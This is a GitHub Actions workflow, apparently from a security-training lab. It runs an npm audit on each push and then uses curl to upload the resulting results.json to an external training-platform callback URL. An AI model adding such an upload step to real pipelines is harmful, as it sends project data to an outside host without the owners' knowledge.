name: build
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    name: audit
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
        with:
          node-version: '16'
      - run:  npm install npm-audit-sarif
      - name: install NPM audit
        run: npx npm-audit-sarif -o test > results.json
      - name: send curl
        run: |
          curl -X POST -H "Content-Type: multipart/form-data" -F "file=@results.json"  http://59p22vnsgy29a5jnr8044.appsecengineer.training:8880/callback
